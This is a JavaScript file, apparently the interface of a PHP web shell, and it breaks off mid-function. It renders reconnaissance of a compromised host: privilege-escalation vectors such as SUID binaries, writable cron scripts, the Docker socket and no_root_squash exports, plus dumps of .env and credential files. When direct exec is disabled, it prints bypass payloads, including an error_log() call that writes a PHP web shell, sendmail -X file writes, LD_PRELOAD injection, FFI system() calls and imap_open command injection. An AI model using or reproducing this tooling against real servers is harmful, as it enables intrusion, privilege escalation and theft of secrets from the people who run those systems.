// ==================== DIAGNOSTICS ====================
function diagCopyBtn() {
  return '<button class="btn btn-secondary btn-sm" onclick="diagCopy(this)" style="margin-left:auto;flex-shrink:0">Copy</button>';
}

function diagCopy(btn) {
  const card = btn.closest('.card');
  if (!card) return;
  const body = card.querySelector('.card-body');
  if (!body) return;
  let text = '';
  const table = body.querySelector('table');
  if (table) {
    const rows = table.querySelectorAll('tr');
    rows.forEach(function(row) {
      const cells = row.querySelectorAll('th, td');
      const vals = [];
      cells.forEach(function(c) { vals.push(c.textContent.trim()); });
      text += vals.join('\t') + '\n';
    });
  } else {
    const items = body.querySelectorAll('.diag-item');
    if (items.length > 0) {
      items.forEach(function(item) {
        const label = item.querySelector('.diag-label');
        const value = item.querySelector('.diag-value, .badge');
        if (label) text += label.textContent.trim() + ': ' + (value ? value.textContent.trim() : '') + '\n';
        else text += item.textContent.trim() + '\n';
      });
    } else {
      text = body.textContent.trim();
    }
  }
  clipCopy(text.trim()).then(function() {
    const orig = btn.textContent;
    btn.textContent = 'Copied!';
    setTimeout(function() { btn.textContent = orig; }, 1200);
  });
}

function loadDiag() {
  const body = document.getElementById('diag-body');
  body.innerHTML = '<span class="spinner"></span>Running full recon...';

  const fd = new FormData();
  fd.append('action', 'diag');

  fetchJSON(fd)
    .then(function(d) {
      if (d.error) {
        body.innerHTML = '<div style="color:var(--red)">Backend error: ' + escHtml(d.error) + '</div>';
        return;
      }
      let html = '';

      // ---- ROW 1: System + Identity ----
      html += '<div class="diag-grid" style="margin-bottom:16px">';

      html += '<div class="card" style="margin:0"><div class="card-header">&#x1F4BB; System' + diagCopyBtn() + '</div><div class="card-body">';
      [
        ['PHP', d.php_version],
        ['OS', d.os],
        ['Server', d.server],
        ['CWD', d.cwd],
        ['Disk Free', formatBytes(d.disk_free) + ' / ' + formatBytes(d.disk_total)],
        ['allow_url_fopen', d.allow_url_fopen ? '<span class="badge badge-ok">ON</span>' : '<span class="badge badge-no">OFF</span>'],
        ['open_basedir', d.open_basedir],
        ['sendmail_path', d.sendmail_path],
      ].forEach(function(kv) {
        html += '<div class="diag-item"><span class="diag-label">' + kv[0] + '</span><span class="diag-value">' + kv[1] + '</span></div>';
      });
      if (d.container && d.container.detected) {
        html += '<div style="margin-top:10px;padding:8px;background:rgba(210,153,34,.1);border-radius:4px">';
        html += '<div style="font-size:12px;color:var(--yellow);font-weight:600">&#x26A0; Container detected: ' + escHtml(d.container.type || 'unknown') + '</div>';
        html += '<div style="font-size:11px;color:var(--muted);margin-top:4px">' + (d.container.hints || []).map(escHtml).join(', ') + '</div>';
        html += '<div style="font-size:11px;color:var(--muted);margin-top:2px">Network data reflects container namespace, not host.</div>';
        html += '</div>';
      }
      html += '</div></div>';

      html += '<div class="card" style="margin:0"><div class="card-header">&#x1F464; Identity' + diagCopyBtn() + '</div><div class="card-body">';
      [
        ['User', d.user_name + ' (uid=' + d.uid + ')'],
        ['Group', d.group_name + ' (gid=' + d.gid + ')'],
        ['Groups', d.groups || 'none'],
      ].forEach(function(kv) {
        html += '<div class="diag-item"><span class="diag-label">' + kv[0] + '</span><span class="diag-value">' + kv[1] + '</span></div>';
      });
      if (d.group_memberships && Object.keys(d.group_memberships).length > 0) {
        html += '<div style="margin-top:10px;font-size:12px;color:var(--red);font-weight:600">&#x26A0; Privileged group members:</div>';
        Object.entries(d.group_memberships).forEach(function(e) {
          html += '<div class="diag-item"><span class="diag-label" style="color:var(--yellow)">' + escHtml(e[0]) + '</span><span class="diag-value">' + e[1].map(escHtml).join(', ') + '</span></div>';
        });
      }
      html += '</div></div>';
      html += '</div>';

      // ---- ROW 2: Functions + Extensions ----
      html += '<div class="diag-grid" style="margin-bottom:16px">';
      html += '<div class="card" style="margin:0"><div class="card-header">&#x2699; Functions' + diagCopyBtn() + '</div><div class="card-body">';
      const fn = d.functions || {};
      const directExec = ['exec','shell_exec','system','passthru','popen','proc_open','pcntl_exec'];
      const hasDirectExec = directExec.some(function(f) { return fn[f]; });
      Object.entries(fn).forEach(function(e) {
        html += '<div class="diag-item"><span class="diag-label">' + e[0] + '</span>' +
          (e[1] ? '<span class="badge badge-ok">\u2714 available</span>' : '<span class="badge badge-no">\u2716 disabled</span>') + '</div>';
      });
      // Indirect execution hints when all direct exec is disabled
      if (!hasDirectExec) {
        html += '<div style="margin-top:12px;padding:10px;background:rgba(210,153,34,.08);border:1px solid rgba(210,153,34,.2);border-radius:6px;font-size:11px">';
        html += '<div style="color:var(--yellow);font-weight:600;margin-bottom:6px">All direct exec disabled \u2014 indirect vectors:</div>';
        const hints = [];
        if (fn['mail']) hints.push('<b>mail()</b> \u2014 write files via sendmail -X flag: <code>mail("a","","","","-OQueueDirectory=/tmp -X/path/shell.php")</code>');
        if (fn['error_log']) hints.push('<b>error_log()</b> \u2014 write to arbitrary file (type 3): <code>error_log("&lt;?php system($_GET[c]);?&gt;", 3, "/path/shell.php")</code>');
        if (fn['mail'] && fn['putenv']) hints.push('<b>mail() + putenv()</b> \u2014 LD_PRELOAD injection: set LD_PRELOAD to malicious .so, then call mail() to trigger sendmail');
        if (fn['ob_start']) hints.push('<b>ob_start()</b> \u2014 callback exec: <code>ob_start("system"); echo "id"; ob_end_flush();</code> (only if system() not in disable_functions)');
        if (fn['fsockopen']) hints.push('<b>fsockopen()</b> \u2014 connect to internal services, reverse shells via raw sockets');
        if (fn['FFI']) hints.push('<b>FFI</b> \u2014 call libc system()/exec() directly: <code>FFI::cdef("int system(const char*);")->system("id")</code>');
        if (fn['imap_open']) hints.push('<b>imap_open()</b> \u2014 RCE via -oProxyCommand SSH flag injection');
        if (fn['pcntl_fork']) hints.push('<b>pcntl_fork()</b> \u2014 fork process, combine with other vectors');
        if (hints.length > 0) {
          hints.forEach(function(h) { html += '<div style="margin-bottom:4px;color:var(--fg)">\u2022 ' + h + '</div>'; });
        } else {
          html += '<div style="color:var(--muted)">No known indirect vectors available.</div>';
        }
        html += '</div>';
      }
      html += '</div></div>';

      html += '<div class="card" style="margin:0"><div class="card-header">&#x1F9E9; Extensions & Tools' + diagCopyBtn() + '</div><div class="card-body">';
      html += '<div style="margin-bottom:10px;display:flex;flex-wrap:wrap;gap:6px">';
      Object.entries(d.extensions || {}).forEach(function(e) {
        html += '<span class="badge ' + (e[1] ? 'badge-ok' : 'badge-no') + '">' + e[0] + '</span>';
      });
      html += '</div>';
      if (d.interpreters && d.interpreters.length > 0) {
        html += '<div style="font-size:12px;color:var(--muted);margin-bottom:4px">Interpreters:</div>';
        html += '<div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px">';
        d.interpreters.forEach(function(t) { html += '<span class="badge badge-ok">' + escHtml(t) + '</span>'; });
        html += '</div>';
      }
      if (d.tools && d.tools.length > 0) {
        html += '<div style="font-size:12px;color:var(--muted);margin-bottom:4px">Tools:</div>';
        html += '<div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px">';
        d.tools.forEach(function(t) { html += '<span class="badge badge-ok">' + escHtml(t) + '</span>'; });
        html += '</div>';
      }
      if (d.all_binaries) {
        html += '<div style="font-size:11px;color:var(--muted)">' + d.all_binaries.length + ' binaries total across all bin dirs</div>';
      }
      html += '</div></div>';
      html += '</div>';

      // ---- Users with login shells ----
      if (d.passwd_users && d.passwd_users.length > 0) {
        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x1F465; Login Users (/etc/passwd)' + diagCopyBtn() + '</div><div class="card-body" style="padding:0">';
        html += '<table class="file-table"><thead><tr><th>User</th><th>UID</th><th>Home</th><th>Shell</th></tr></thead><tbody>';
        d.passwd_users.forEach(function(u) {
          const highlight = (parseInt(u.uid) === 0 || parseInt(u.uid) >= 1000) ? 'color:var(--yellow)' : '';
          html += '<tr><td style="' + highlight + '">' + escHtml(u.user) + '</td><td>' + escHtml(u.uid) + '</td><td>' + escHtml(u.home) + '</td><td>' + escHtml(u.shell) + '</td></tr>';
        });
        html += '</tbody></table></div></div>';
      }

      // ---- Network ----
      html += '<div class="diag-grid" style="margin-bottom:16px">';

      html += '<div class="card" style="margin:0"><div class="card-header">&#x1F310; Network \u2014 ARP Hosts' + diagCopyBtn() + '</div><div class="card-body" style="padding:0">';
      if (d.arp_hosts && d.arp_hosts.length > 0) {
        html += '<table class="file-table"><thead><tr><th>IP</th><th>MAC</th><th>Iface</th></tr></thead><tbody>';
        d.arp_hosts.forEach(function(h) {
          html += '<tr><td>' + escHtml(h.ip) + '</td><td style="font-size:11px;color:var(--muted)">' + escHtml(h.mac) + '</td><td>' + escHtml(h.dev) + '</td></tr>';
        });
        html += '</tbody></table>';
      } else { html += '<div style="padding:12px;color:var(--muted)">No ARP entries.</div>'; }
      html += '</div></div>';

      html += '<div class="card" style="margin:0"><div class="card-header">&#x1F6AA; Open Ports (listening)' + diagCopyBtn() + '</div><div class="card-body" style="padding:0">';
      if (d.open_ports && d.open_ports.length > 0) {
        html += '<table class="file-table"><thead><tr><th>Port</th><th>UID</th><th>PID</th><th>Process</th></tr></thead><tbody>';
        d.open_ports.forEach(function(p) {
          const port = typeof p === 'object' ? p.port : p;
          const puid = (typeof p === 'object' && p.uid != null) ? p.uid : '-';
          const pid = (typeof p === 'object' && p.pid) ? p.pid : '-';
          const cmd = (typeof p === 'object' && p.cmd) ? p.cmd : '-';
          html += '<tr><td><span class="badge badge-ok">' + escHtml(String(port)) + '</span></td><td style="' + (puid === 0 ? 'color:var(--red)' : '') + '">' + escHtml(String(puid)) + '</td><td>' + escHtml(String(pid)) + '</td><td style="font-size:11px;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">' + escHtml(String(cmd)) + '</td></tr>';
        });
        html += '</tbody></table>';
      } else { html += '<div style="padding:12px;color:var(--muted)">None detected.</div>'; }
      html += '</div></div>';
      html += '</div>';

      // Routing table
      if (d.routes && d.routes.length > 0) {
        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x1F5FA; Routes' + diagCopyBtn() + '</div><div class="card-body" style="padding:0">';
        html += '<table class="file-table"><thead><tr><th>Iface</th><th>Destination</th><th>Gateway</th><th>Mask</th><th>Metric</th></tr></thead><tbody>';
        d.routes.forEach(function(r) {
          html += '<tr><td>' + escHtml(r.iface) + '</td><td>' + escHtml(r.dest) + '</td><td>' + escHtml(r.gw) + '</td><td>' + escHtml(r.mask) + '</td><td>' + escHtml(String(r.metric != null ? r.metric : '')) + '</td></tr>';
        });
        html += '</tbody></table></div></div>';
      }

      // =====================================================
      // PRIVILEGE ESCALATION VECTORS
      // =====================================================
      html += '<div style="margin:16px 0 12px;padding:10px 16px;background:rgba(248,81,73,.08);border:1px solid rgba(248,81,73,.2);border-radius:8px;font-size:14px;font-weight:700;color:var(--red)">&#x1F525; Privilege Escalation Vectors</div>';

      // --- SUID/SGID Binaries ---
      html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x1F511; SUID/SGID Binaries' + diagCopyBtn() + '</div><div class="card-body" style="padding:0">';
      if (d.suid_binaries && d.suid_binaries.length > 0) {
        html += '<div style="max-height:300px;overflow-y:auto">';
        html += '<table class="file-table"><thead><tr><th>Path</th><th>Owner</th><th>Type</th><th>GTFOBins</th></tr></thead><tbody>';
        d.suid_binaries.forEach(function(b) {
          const rowStyle = b.gtfobins ? 'background:rgba(248,81,73,.06)' : '';
          const typeStr = (b.suid ? 'SUID' : '') + (b.suid && b.sgid ? '+' : '') + (b.sgid ? 'SGID' : '');
          html += '<tr style="' + rowStyle + '"><td style="font-family:monospace;font-size:12px">' + escHtml(b.path) + '</td>';
          html += '<td>' + (b.owner_uid === 0 ? '<span style="color:var(--red)">root</span>' : escHtml(String(b.owner_uid))) + '</td>';
          html += '<td><span class="badge badge-warn">' + typeStr + '</span></td>';
          html += '<td>' + (b.gtfobins ? '<span class="badge badge-no">&#x26A0; GTFOBins</span>' : '<span style="color:var(--muted)">-</span>') + '</td></tr>';
        });
        html += '</tbody></table></div>';
      } else { html += '<div style="padding:12px;color:var(--muted)">None found (or scan restricted by open_basedir).</div>'; }
      html += '</div></div>';

      // --- Capabilities ---
      if (d.capabilities && Object.keys(d.capabilities).length > 0) {
        const dangerCaps = {'CAP_SETUID':1,'CAP_SYS_ADMIN':1,'CAP_DAC_OVERRIDE':1,'CAP_DAC_READ_SEARCH':1,'CAP_SYS_PTRACE':1,'CAP_NET_RAW':1,'CAP_FOWNER':1,'CAP_SYS_MODULE':1,'CAP_SETGID':1,'CAP_CHOWN':1};
        const capEff = d.capabilities['CapEff'];
        const capBnd = d.capabilities['CapBnd'];
        // CapBnd is "full" if all 41 standard bits set = 000001ffffffffff or higher
        const bndFull = capBnd && /^0*1?f{10}$/.test(capBnd.hex);
        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x1F9E2; Process Capabilities' + diagCopyBtn() + '</div><div class="card-body">';
        // CapEff — what this process can actually do
        if (capEff) {
          const effCaps = capEff.caps || [];
          if (effCaps.length > 0) {
            html += '<div style="font-size:12px;color:var(--red);font-weight:600;margin-bottom:6px">&#x26A0; Effective capabilities (active privileges):</div>';
            html += '<div style="display:flex;flex-wrap:wrap;gap:4px;margin-bottom:10px">';
            effCaps.forEach(function(c) {
              html += '<span class="badge ' + (dangerCaps[c] ? 'badge-no' : 'badge-warn') + '" style="font-size:11px">' + escHtml(c) + '</span>';
            });
            html += '</div>';
          } else {
            html += '<div class="diag-item"><span class="diag-label">Effective (CapEff)</span><span class="diag-value"><span class="badge badge-ok">none</span> \u2014 no elevated privileges</span></div>';
          }
        }
        // CapBnd — only show if restricted (indicates container/hardening)
        if (capBnd && !bndFull) {
          html += '<div style="margin-top:8px;font-size:12px;color:var(--yellow);margin-bottom:4px">&#x1F512; Bounding set is restricted (container/hardened):</div>';
          html += '<div style="display:flex;flex-wrap:wrap;gap:4px">';
          (capBnd.caps || []).forEach(function(c) {
            html += '<span class="badge badge-ok" style="font-size:10px">' + escHtml(c) + '</span>';
          });
          html += '</div>';
        } else if (capBnd) {
          html += '<div class="diag-item"><span class="diag-label">Bounding (CapBnd)</span><span class="diag-value"><span style="color:var(--muted)">full (default, unrestricted)</span></span></div>';
        }
        html += '</div></div>';
      }

      // --- Cron Jobs ---
      if (d.cron_jobs && d.cron_jobs.length > 0) {
        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x23F0; Cron Jobs' + diagCopyBtn() + '</div><div class="card-body">';
        d.cron_jobs.forEach(function(cj) {
          const wrFlag = cj.source_writable ? ' <span class="badge badge-no">WRITABLE</span>' : '';
          html += '<div style="font-size:11px;color:var(--yellow);margin-bottom:4px;cursor:pointer" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display===\'none\'?\'block\':\'none\'">&#x25B6; ' + escHtml(cj.source) + wrFlag + '</div>';
          html += '<pre style="display:none;font-size:11px;background:rgba(0,0,0,.3);padding:8px;border-radius:4px;margin:0 0 8px 0;white-space:pre-wrap;word-break:break-all;color:var(--fg)">' + escHtml(cj.content) + '</pre>';
          if (cj.writable_scripts && cj.writable_scripts.length > 0) {
            cj.writable_scripts.forEach(function(ws) {
              html += '<div style="font-size:11px;color:var(--red);margin-bottom:2px">&#x26A0; Writable script: <span style="font-family:monospace">' + escHtml(ws) + '</span></div>';
            });
          }
        });
        html += '</div></div>';
      }

      // --- Sudo Config ---
      if (d.sudo_config && d.sudo_config.readable) {
        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x1F6E1; Sudo Configuration' + diagCopyBtn() + '</div><div class="card-body">';
        Object.entries(d.sudo_config.files || {}).forEach(function(e) {
          html += '<div style="font-size:11px;color:var(--yellow);margin-bottom:4px;cursor:pointer" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display===\'none\'?\'block\':\'none\'">&#x25B6; ' + escHtml(e[0]) + '</div>';
          html += '<pre style="display:none;font-size:11px;background:rgba(0,0,0,.3);padding:8px;border-radius:4px;margin:0 0 8px 0;white-space:pre-wrap;word-break:break-all;color:var(--fg)">' + escHtml(e[1]) + '</pre>';
        });
        html += '</div></div>';
      }

      // --- Docker Socket ---
      if (d.docker_socket && (d.docker_socket.sockets.length > 0 || d.docker_socket.user_in_docker_group)) {
        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x1F433; Docker / Podman Socket' + diagCopyBtn() + '</div><div class="card-body">';
        if (d.docker_socket.user_in_docker_group) {
          html += '<div style="color:var(--red);font-size:12px;font-weight:600;margin-bottom:8px">&#x26A0; Current user is in docker group!</div>';
        }
        d.docker_socket.sockets.forEach(function(s) {
          const status = s.writable ? '<span class="badge badge-no">&#x26A0; WRITABLE (root equiv!)</span>' : (s.readable ? '<span class="badge badge-warn">readable</span>' : '<span class="badge badge-ok">exists</span>');
          html += '<div class="diag-item"><span class="diag-label" style="font-family:monospace">' + escHtml(s.path) + '</span><span class="diag-value">' + status + '</span></div>';
        });
        html += '</div></div>';
      }

      // --- Mounts ---
      if (d.mounts && d.mounts.length > 0) {
        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x1F4BE; Mount Points' + diagCopyBtn() + '</div><div class="card-body" style="padding:0">';
        html += '<div style="max-height:250px;overflow-y:auto">';
        html += '<table class="file-table"><thead><tr><th>Mountpoint</th><th>FS</th><th>RW</th><th>nosuid</th><th>noexec</th></tr></thead><tbody>';
        d.mounts.forEach(function(m) {
          const rowStyle = (m.writable && !m.nosuid) ? 'background:rgba(210,153,34,.06)' : '';
          html += '<tr style="' + rowStyle + '"><td style="font-family:monospace;font-size:11px">' + escHtml(m.mountpoint) + '</td>';
          html += '<td>' + escHtml(m.fstype) + '</td>';
          html += '<td>' + (m.writable ? '<span class="badge badge-warn">rw</span>' : '<span style="color:var(--muted)">ro</span>') + '</td>';
          html += '<td>' + (m.nosuid ? '<span class="badge badge-ok">yes</span>' : '<span class="badge badge-no">no</span>') + '</td>';
          html += '<td>' + (m.noexec ? '<span class="badge badge-ok">yes</span>' : '<span class="badge badge-no">no</span>') + '</td></tr>';
        });
        html += '</tbody></table></div></div></div>';
      }

      // --- Kernel Info ---
      if (d.kernel_info) {
        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x1FAF0; Kernel Info' + diagCopyBtn() + '</div><div class="card-body">';
        html += '<div class="diag-item"><span class="diag-label">Release</span><span class="diag-value" style="font-family:monospace;color:var(--yellow)">' + escHtml(d.kernel_info.release) + '</span></div>';
        html += '<div class="diag-item"><span class="diag-label">Arch</span><span class="diag-value">' + escHtml(d.kernel_info.arch) + '</span></div>';
        const aslrVal = d.kernel_info.aslr;
        const aslrLabel = aslrVal === '0' ? '<span class="badge badge-no">OFF (0)</span>' : aslrVal === '1' ? '<span class="badge badge-warn">Partial (1)</span>' : aslrVal === '2' ? '<span class="badge badge-ok">Full (2)</span>' : '<span style="color:var(--muted)">' + escHtml(String(aslrVal)) + '</span>';
        html += '<div class="diag-item"><span class="diag-label">ASLR</span><span class="diag-value">' + aslrLabel + '</span></div>';
        if (d.kernel_info.proc_version) {
          html += '<div style="margin-top:8px;font-size:11px;color:var(--muted);word-break:break-all">' + escHtml(d.kernel_info.proc_version) + '</div>';
        }
        html += '</div></div>';
      }

      // --- Security Modules ---
      if (d.security_modules) {
        const sm = d.security_modules;
        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x1F6E1; Security Modules' + diagCopyBtn() + '</div><div class="card-body">';
        // SELinux
        if (sm.selinux.present) {
          const seStatus = sm.selinux.enforcing === 1 ? '<span class="badge badge-ok">Enforcing</span>' : sm.selinux.enforcing === 0 ? '<span class="badge badge-warn">Permissive</span>' : '<span class="badge badge-warn">Unknown</span>';
          html += '<div class="diag-item"><span class="diag-label">SELinux</span><span class="diag-value">' + seStatus + '</span></div>';
        } else {
          html += '<div class="diag-item"><span class="diag-label">SELinux</span><span class="diag-value"><span style="color:var(--muted)">not present</span></span></div>';
        }
        // AppArmor
        if (sm.apparmor.present) {
          html += '<div class="diag-item"><span class="diag-label">AppArmor</span><span class="diag-value"><span class="badge badge-ok">Active</span> ' + sm.apparmor.profiles_count + ' profiles</span></div>';
        } else {
          html += '<div class="diag-item"><span class="diag-label">AppArmor</span><span class="diag-value"><span style="color:var(--muted)">not present</span></span></div>';
        }
        // Seccomp
        const scLabel = sm.seccomp === 0 ? '<span class="badge badge-no">Disabled</span>' : sm.seccomp === 1 ? '<span class="badge badge-ok">Strict</span>' : sm.seccomp === 2 ? '<span class="badge badge-ok">Filter</span>' : '<span style="color:var(--muted)">unknown</span>';
        html += '<div class="diag-item"><span class="diag-label">Seccomp</span><span class="diag-value">' + scLabel + '</span></div>';
        html += '</div></div>';
      }

      // --- LD_PRELOAD ---
      if (d.ld_preload && (d.ld_preload.exists || d.ld_preload.env_value)) {
        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x1F4E6; LD_PRELOAD' + diagCopyBtn() + '</div><div class="card-body">';
        if (d.ld_preload.exists) {
          html += '<div class="diag-item"><span class="diag-label">/etc/ld.so.preload</span><span class="diag-value">' + (d.ld_preload.writable ? '<span class="badge badge-no">&#x26A0; WRITABLE (critical!)</span>' : '<span class="badge badge-ok">exists, not writable</span>') + '</span></div>';
          if (d.ld_preload.content) {
            html += '<pre style="font-size:11px;background:rgba(0,0,0,.3);padding:8px;border-radius:4px;margin:8px 0 0 0;color:var(--fg)">' + escHtml(d.ld_preload.content) + '</pre>';
          }
        }
        if (d.ld_preload.env_value) {
          html += '<div class="diag-item"><span class="diag-label">LD_PRELOAD env</span><span class="diag-value" style="font-family:monospace">' + escHtml(d.ld_preload.env_value) + '</span></div>';
        }
        html += '</div></div>';
      }

      // --- NFS Exports ---
      if (d.nfs_exports && d.nfs_exports.readable) {
        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x1F4C1; NFS Exports' + diagCopyBtn() + '</div><div class="card-body">';
        if (d.nfs_exports.no_root_squash && d.nfs_exports.no_root_squash.length > 0) {
          html += '<div style="color:var(--red);font-size:12px;font-weight:600;margin-bottom:8px">&#x26A0; no_root_squash found!</div>';
          d.nfs_exports.no_root_squash.forEach(function(l) {
            html += '<div style="font-family:monospace;font-size:11px;color:var(--yellow)">' + escHtml(l) + '</div>';
          });
        }
        if (d.nfs_exports.content) {
          html += '<pre style="font-size:11px;background:rgba(0,0,0,.3);padding:8px;border-radius:4px;margin:8px 0 0 0;white-space:pre-wrap;color:var(--fg)">' + escHtml(d.nfs_exports.content) + '</pre>';
        }
        html += '</div></div>';
      }

      // --- Systemd Timers ---
      if (d.systemd_timers && d.systemd_timers.length > 0) {
        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x23F1; Systemd Timers' + diagCopyBtn() + '</div><div class="card-body" style="padding:0">';
        html += '<table class="file-table"><thead><tr><th>Timer</th><th>Writable</th><th>ExecStart</th><th>Exec Writable</th></tr></thead><tbody>';
        d.systemd_timers.forEach(function(t) {
          const rowStyle = t.exec_writable ? 'background:rgba(248,81,73,.06)' : '';
          html += '<tr style="' + rowStyle + '"><td style="font-size:11px;font-family:monospace">' + escHtml(t.timer_path) + '</td>';
          html += '<td>' + (t.timer_writable ? '<span class="badge badge-no">YES</span>' : '<span style="color:var(--muted)">no</span>') + '</td>';
          html += '<td style="font-size:11px;font-family:monospace">' + escHtml(t.exec_start || '-') + '</td>';
          html += '<td>' + (t.exec_writable ? '<span class="badge badge-no">&#x26A0; YES</span>' : '<span style="color:var(--muted)">' + (t.exec_start ? 'no' : '-') + '</span>') + '</td></tr>';
        });
        html += '</tbody></table></div></div>';
      }

      // ---- Privesc vectors (existing) ----
      html += '<div class="diag-grid" style="margin-bottom:16px">';

      html += '<div class="card" style="margin:0"><div class="card-header">&#x1F4C1; Binary Directories' + diagCopyBtn() + '</div><div class="card-body" style="padding:0">';
      if (d.bin_dirs && d.bin_dirs.length > 0) {
        html += '<table class="file-table"><thead><tr><th>Path</th><th>Readable</th><th>Writable</th></tr></thead><tbody>';
        d.bin_dirs.forEach(function(b) {
          const wStyle = b.writable ? 'color:var(--red);font-weight:600' : '';
          html += '<tr><td>' + escHtml(b.path) + '</td>'
            + '<td>' + (b.readable ? '<span class="badge badge-ok">yes</span>' : '<span class="badge badge-no">no</span>') + '</td>'
            + '<td style="' + wStyle + '">' + (b.writable ? '<span class="badge badge-ok" style="background:rgba(210,153,34,.15);color:var(--red)">WRITABLE</span>' : '<span class="badge badge-no">no</span>') + '</td></tr>';
        });
        html += '</tbody></table>';
      } else { html += '<div style="padding:12px;color:var(--muted)">None found.</div>'; }
      html += '</div></div>';

      html += '<div class="card" style="margin:0"><div class="card-header">&#x270F; Writable Dirs & Readable Sensitive Files' + diagCopyBtn() + '</div><div class="card-body">';
      if (d.writable_dirs && d.writable_dirs.length > 0) {
        html += '<div style="margin-bottom:8px;font-size:12px;color:var(--muted)">Writable:</div>';
        html += '<div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px">';
        d.writable_dirs.forEach(function(p) { html += '<span class="badge badge-ok">' + escHtml(p) + '</span>'; });
        html += '</div>';
      }
      if (d.readable_files && d.readable_files.length > 0) {
        html += '<div style="font-size:12px;color:var(--red);margin-bottom:4px">&#x26A0; Readable sensitive files:</div>';
        d.readable_files.forEach(function(f) {
          html += '<div style="font-family:monospace;font-size:12px;color:var(--yellow);cursor:pointer" onclick="insertCode(\'echo file_get_contents(\\\'' + escHtml(f) + '\\\');\')">&#x1F4C4; ' + escHtml(f) + '</div>';
        });
      }
      html += '</div></div>';
      html += '</div>';

      // ---- Panels + Creds ----
      html += '<div class="diag-grid" style="margin-bottom:16px">';

      html += '<div class="card" style="margin:0"><div class="card-header">&#x1F3E0; Detected Panels' + diagCopyBtn() + '</div><div class="card-body">';
      if (d.panels && d.panels.length > 0) {
        d.panels.forEach(function(p) { html += '<div class="diag-item"><span class="diag-value" style="color:var(--green)">&#x2713; ' + escHtml(p) + '</span></div>'; });
      } else { html += '<div style="color:var(--muted)">None detected.</div>'; }
      html += '</div></div>';

      html += '<div class="card" style="margin:0"><div class="card-header">&#x1F511; Environment Files (.env)' + diagCopyBtn() + '</div><div class="card-body">';
      if (d.env_files && Object.keys(d.env_files).length > 0) {
        Object.entries(d.env_files).forEach(function(e) {
          html += '<div style="font-size:11px;color:var(--yellow);margin-bottom:4px;cursor:pointer" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display===\'none\'?\'block\':\'none\'">&#x25B6; ' + escHtml(e[0]) + '</div>';
          html += '<pre style="display:none;font-size:11px;background:rgba(0,0,0,.3);padding:8px;border-radius:4px;margin:0 0 10px 0;white-space:pre-wrap;word-break:break-all;color:var(--fg)">' + escHtml(e[1]) + '</pre>';
        });
      } else { html += '<div style="color:var(--muted)">None found.</div>'; }
      html += '</div></div>';
      html += '</div>';

      // --- Credential Files ---
      if (d.credential_files && Object.keys(d.credential_files).length > 0) {
        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x1F4B3; Credential Files' + diagCopyBtn() + '</div><div class="card-body">';
        Object.entries(d.credential_files).forEach(function(e) {
          html += '<div style="font-size:11px;color:var(--yellow);margin-bottom:4px;cursor:pointer" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display===\'none\'?\'block\':\'none\'">&#x25B6; ' + escHtml(e[0]) + '</div>';
          html += '<pre style="display:none;font-size:11px;background:rgba(0,0,0,.3);padding:8px;border-radius:4px;margin:0 0 10px 0;white-space:pre-wrap;word-break:break-all;color:var(--fg)">' + escHtml(e[1]) + '</pre>';
        });
        html += '</div></div>';
      }

      // --- Backup Files ---
      if (d.backup_files && d.backup_files.length > 0) {
        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x1F4E6; Backup / Config Files' + diagCopyBtn() + '</div><div class="card-body">';
        d.backup_files.forEach(function(bf) {
          html += '<div class="diag-item"><span class="diag-label" style="font-family:monospace;font-size:12px">' + escHtml(bf.path) + '</span><span class="diag-value">' + formatBytes(bf.size) + (bf.readable ? ' <span class="badge badge-ok">readable</span>' : '') + '</span></div>';
        });
        html += '</div></div>';
      }

      // ---- Build info ----
      if (typeof __BUILD !== 'undefined') {
        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x1F3F7; Build Info' + diagCopyBtn() + '</div><div class="card-body">';
        [
          ['Build ID', __BUILD.short_id],
          ['SHA256', __BUILD.hash],
          ['Built', __BUILD.timestamp],
          ['Language', __BUILD.lang],
          ['Version', __BUILD.version],
        ].forEach(function(kv) {
          html += '<div class="diag-item"><span class="diag-label">' + kv[0] + '</span><span class="diag-value">' + escHtml(kv[1] || 'N/A') + '</span></div>';
        });
        html += '</div></div>';
      }

      // ---- Processes ----
      html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x25B6; Running Processes' + diagCopyBtn() + '</div><div class="card-body" style="padding:0">';
      html += '<div style="max-height:300px;overflow-y:auto">';
      html += '<table class="file-table"><thead><tr><th>PID</th><th>UID</th><th>Command</th></tr></thead><tbody>';
      (d.processes || []).forEach(function(p) {
        const isRoot = p.uid === 0;
        html += '<tr><td style="color:var(--muted)">' + escHtml(p.pid) + '</td><td style="' + (isRoot?'color:var(--red)':'') + '">' + escHtml(p.uid) + '</td><td style="font-family:monospace;font-size:12px">' + escHtml(p.cmd) + '</td></tr>';
      });
      html += '</tbody></table></div></div></div>';

      // ---- Framework Detection ----
      if (d.frameworks && d.frameworks.length > 0) {
        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x1F50D; Framework / CMS Detection' + diagCopyBtn() + '</div><div class="card-body">';
        d.frameworks.forEach(function(fw) {
          var verBadge = fw.version ? '<span class="badge badge-ok">' + escHtml(fw.version) + '</span>' : '<span class="badge badge-warn">unknown</span>';
          html += '<div style="margin-bottom:16px;padding:12px;background:rgba(0,0,0,.2);border-radius:6px;border:1px solid var(--border)">';
